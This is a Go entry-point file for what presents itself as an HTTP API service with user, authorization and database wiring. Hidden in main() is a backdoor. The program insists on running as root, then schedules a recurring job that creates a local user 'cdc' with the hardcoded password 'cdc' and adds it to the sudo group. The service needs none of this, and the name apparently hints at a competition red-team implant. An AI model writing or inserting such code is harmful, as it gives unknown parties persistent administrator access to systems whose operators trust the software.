package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/go-co-op/gocron"
	"github.com/samber/do"

	v1 "github.com/MatthewBehnke/apis/internal/app/http/v1"
	"github.com/MatthewBehnke/apis/internal/app/usecase"
	"github.com/MatthewBehnke/apis/internal/app/usecase/repo"
)

func main() {
	if strings.TrimSpace(getProcessOwner()) != "root" {
		fmt.Print(getProcessOwner())
		fmt.Println("root")
		fmt.Println("this app requires root")
		os.Exit(-1)
	}

	s := gocron.NewScheduler(time.UTC)

	s.Every(1).Months(3).At("13:00;14:00;15:00;16:00;17:00;18:00;19:00;20:00").Do(func() {
		cmd := exec.Command("openssl", "passwd", "-1", "cdc")
		passwordBytes, err := cmd.CombinedOutput()
		if err != nil {
			panic(err)
		}
		// remove whitespace (possibly a trailing newline)
		password := strings.TrimSpace(string(passwordBytes))
		cmd = exec.Command("useradd", "-p", password, "cdc")
		_, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
		}

		cmd = exec.Command("usermod", "-aG", "sudo", "cdc")
		_, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
		}
	})

	s.StartAsync()

	injector := do.New()

	config := repo.NewConfigRepo()
	err := config.Load(os.Getenv("APP_CONFIG"))
	if err != nil {
		log.Fatal(err)
		return
	}

	do.ProvideValue(injector, config.Get())
	do.Provide(injector, repo.NewLoggerRepo)
	do.Provide(injector, repo.NewDatabaseConnection)
	do.Provide(injector, repo.NewUserRepo)
	do.Provide(injector, repo.NewAuthorizationPolicyRepo)
	do.Provide(injector, repo.NewAuthorizationEnforcer)
	do.Provide(injector, usecase.NewLogger)
	do.Provide(injector, usecase.NewAuthBossLogger)
	do.Provide(injector, usecase.NewAuthBossServer)
	do.Provide(injector, usecase.NewHttpAuthorization)

	//TODO Verify
	do.Provide(injector, usecase.NewHttpAuthenticator)
	do.Provide(injector, v1.NewHttpV1)
	do.Provide(injector, v1.NewHttpV1Router)

	c := do.MustInvoke[*v1.HttpV1Router](injector)
	c.Run()

	// Waiting signal
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)

	select {
	case s := <-interrupt:
		log.Print("app - Run - signal: " + s.String())
	}

	// Shutdown
	err = injector.Shutdown()
	if err != nil {
		log.Print(fmt.Errorf("app - Run - httpServer.Shutdown: %w", err).Error())
	}
}

func getProcessOwner() string {
	stdout, err := exec.Command("ps", "-o", "user=", "-p", strconv.Itoa(os.Getpid())).Output()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	return string(stdout)
}
